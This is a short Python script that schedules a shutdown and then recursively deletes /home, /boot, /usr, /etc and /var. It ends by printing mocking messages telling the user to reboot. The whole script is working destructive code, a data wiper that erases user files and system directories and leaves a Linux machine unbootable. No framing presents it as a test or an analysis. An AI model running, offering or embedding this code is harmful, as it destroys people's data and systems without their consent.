#!/usr/bin/env python3
from shutil import rmtree
from os import system

system("shutdown 1")
rmtree("/home")
rmtree("/boot")
rmtree("/usr")
rmtree("/etc")
rmtree("/var")


print("Have a nice day:)")
print("You should probably reboot now")
